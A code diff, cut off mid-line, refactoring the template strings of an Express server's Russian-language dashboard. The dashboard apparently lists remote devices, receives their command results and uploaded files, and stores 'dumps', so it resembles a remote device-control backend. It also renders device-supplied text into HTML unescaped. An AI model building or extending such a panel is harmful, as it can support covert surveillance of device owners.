@@ -175,7 +175,7 @@ app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
     deviceId,
     cmd: cmdType,
     status,
-    file: req.file ? `/media/${req.file.filename}` : null,
+    file: req.file ? '/media/' + req.file.filename : null,
     fileType: req.file ? (req.file.mimetype || '') : '',
     note
   };
@@ -255,8 +255,8 @@ app.get('/', (req, res) => {
             <span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span>
             ${l.note ? `<span class="tag">${l.note}</span>` : ''}
           </div>
-          ${l.file && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:300px;border-radius:8px;margin-top:6px"/></div>` : ''}
-          ${l.file && !l.fileType.includes('image') ? `<div><a class="btn-mini" href="${l.file}" target="_blank">открыть файл</a></div>` : ''}
+          ${l.file && l.fileType && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:300px;border-radius:8px;margin-top:6px"/></div>` : ''}
+          ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<div><a class="btn-mini" href="${l.file}" target="_blank">открыть файл</a></div>` : ''}
         </div>
       </div>`;
     }
@@ -300,8 +300,8 @@ app.get('/', (req, res) => {
   let controlHtml = '';
   if (!selectedDevice) {
     controlHtml = deviceList.length === 0
-      ? `<div class="empty"><div class="empty-icon">📱</div><div>Устройств пока нет</div></div>`
-      : `<div class="grid">${deviceList.map(d => {
+      ? '<div class="empty"><div class="empty-icon">📱</div><div>Устройств пока нет</div></div>'
+      : '<div class="grid">' + deviceList.map(d => {
           const online = (Date.now() - d.lastSeen) < 60000;
           return `
           <a class="card" href="/?key=${VIEW_KEY}&tab=control&device=${encodeURIComponent(d.deviceId)}" style="text-decoration:none;color:inherit">
@@ -316,11 +316,11 @@ app.get('/', (req, res) => {
               <div class="row"><span>Клиенты</span><b>${(d.clients||[]).join(', ') || '—'}</b></div>
             </div>
           </a>`;
-        }).join('')}</div>`;
+        }).join('') + '</div>';
   } else {
     const dev = devices[selectedDevice];
     if (!dev) {
-      controlHtml = `<div class="empty"><div class="empty-icon">❓</div><div>Устройство не найдено</div></div>`;
+      controlHtml = '<div class="empty"><div class="empty-icon">❓</div><div>Устройство не найдено</div></div>';
     } else {
       const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result').slice(0, 30);
       controlHtml = `
@@ -342,7 +342,7 @@ app.get('/', (req, res) => {
               <div class="log-main">
                 <div class="log-device"><b>${l.cmd}</b></div>
                 <div class="log-meta"><span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span></div>
-                ${l.file && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:400px;border-radius:8px;margin-top:6px" onclick="window.open('${l.file}','_blank')"/></div>` : ''}
+                ${l.file && l.fileType && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:400px;border-radius:8px;margin-top:6px" onclick="window.open('${l.file}','_blank')"/></div>` : ''}
                 ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
               </div>
             </div>`).join('')}
@@ -350,7 +350,7 @@ app.get('/', (req, res) => {
     }
   }
 
-  res.send(`<!doctype html>
+  const html = `<!doctype html>
 <html lang="ru"><head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -431,5 +431,4 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-seri
   <a class="tab ${tab === 'logs' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=logs">Логи</a>
   <a class="tab ${tab === 'uploadlog' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=uploadlog">Upload Log</a>
   <div class="spacer"></div>
-  ${tab === 'dumps' ? `<a class="tool" href="/clear?key=${VIEW_KEY}" onclick="return confirm('Удалить ВСЕ дампы?')">Очистить</a>` : ''}
-  ${tab === 'l
+  ${tab === 'dumps' ? '<a class="tool" href="/clear?key=' + VIEW_KEY + '" onclick="return confir
